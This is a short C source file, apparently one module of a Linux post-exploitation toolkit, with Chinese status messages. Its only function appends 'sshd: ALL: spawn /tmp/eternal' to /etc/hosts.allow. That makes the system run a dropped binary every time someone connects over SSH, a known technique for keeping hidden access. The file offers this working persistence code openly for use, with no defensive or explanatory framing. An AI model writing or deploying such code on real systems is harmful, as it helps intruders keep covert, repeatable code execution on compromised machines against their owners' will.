#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "info.h"
#include "linux_persistence_hosts_allow.h"

#ifdef HOSTS_ALLOW_MOD
void setup_hosts_allow_persistence() {
    printf("设置 /etc/hosts.allow 持久化...\n");
    const char* hosts_allow_path = "/etc/hosts.allow";
    FILE *hosts_allow_file = fopen(hosts_allow_path, "a");
    if (hosts_allow_file) {
        fprintf(hosts_allow_file, "sshd: ALL: spawn /tmp/eternal\n");
        fclose(hosts_allow_file);
        printf("持久化命令已添加到 /etc/hosts.allow。\n");
    } else {
        perror("无法打开 /etc/hosts.allow 文件");
    }
}
#endif
